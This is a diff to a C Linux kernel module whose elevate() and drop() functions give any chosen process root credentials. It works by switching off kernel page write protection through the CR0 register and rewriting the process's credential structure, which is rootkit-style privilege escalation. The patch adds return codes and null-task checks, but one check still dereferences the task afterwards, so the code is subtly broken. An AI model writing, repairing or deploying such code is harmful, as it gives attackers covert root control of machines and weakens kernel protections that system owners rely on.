@@ -10,16 +10,14 @@ static PID_NODE *head = NULL;
 int drop(const pid_t pid) {
   if (!pid)
     return -EINVAL;
-  process_deescalate(pid);
-  return 0;
+  return process_deescalate(pid);
 }
 
 /* elevate a process's EUID */
 int elevate(const pid_t pid) {
   if (!pid)
     return -EINVAL;
-  process_escalate(pid);
-  return 0;
+  return process_escalate(pid);
 }
 
 int elevate_exit(void) {
@@ -116,7 +114,7 @@ static void delete_pid_node(PID_NODE **head, PID_NODE *node){
   kfree(node);
 }
 
-static void process_escalate(pid_t pid){
+static int process_escalate(pid_t pid){
   /*We have the PID we want escalated to root
     Let us get the task struct*/
   PID_NODE *new_node;
@@ -126,6 +124,10 @@ static void process_escalate(pid_t pid){
   printk("process_escalate()");
 #endif
   task = pid_task(find_get_pid(pid), PIDTYPE_PID);
+  
+  if (IS_ERR_OR_NULL(task))
+    return -EINVAL;
+  
   if(find_pid_node(&head, pid) == NULL){
     /*create new pid node*/
     new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
@@ -164,10 +166,11 @@ static void process_escalate(pid_t pid){
 #endif
 }
 
-static void process_deescalate(pid_t pid){
+static int process_deescalate(pid_t pid){
   struct task_struct *task;
   PID_NODE *node;
   struct cred *pcred;
+  int retval;
 #ifdef DEBUG
   printk("process_deescalate()");
 #endif
@@ -177,6 +180,10 @@ static void process_deescalate(pid_t pid){
     write_cr0(read_cr0() & (~0x10000)); //disable page protection
     /* fill in the members from the task for backup*/
     task = pid_task(find_get_pid(node->pid), PIDTYPE_PID);
+    retval = 0;
+    
+    if (IS_ERR_OR_NULL(task))
+      retval = -EINVAL;
     pcred = (struct cred *)task->cred;
     /* descalate task */
     pcred->uid = node->uid;
@@ -192,10 +199,11 @@ static void process_deescalate(pid_t pid){
     write_cr0(read_cr0() | 0x10000); //enable page protection
     /*delete pid node from LL*/
     delete_pid_node(&head, node);
-    return;
+    return retval;
   }
 #ifdef DEBUG
   printk("process %d not in list", pid);
 #endif
+  return -EINVAL;
 }
 
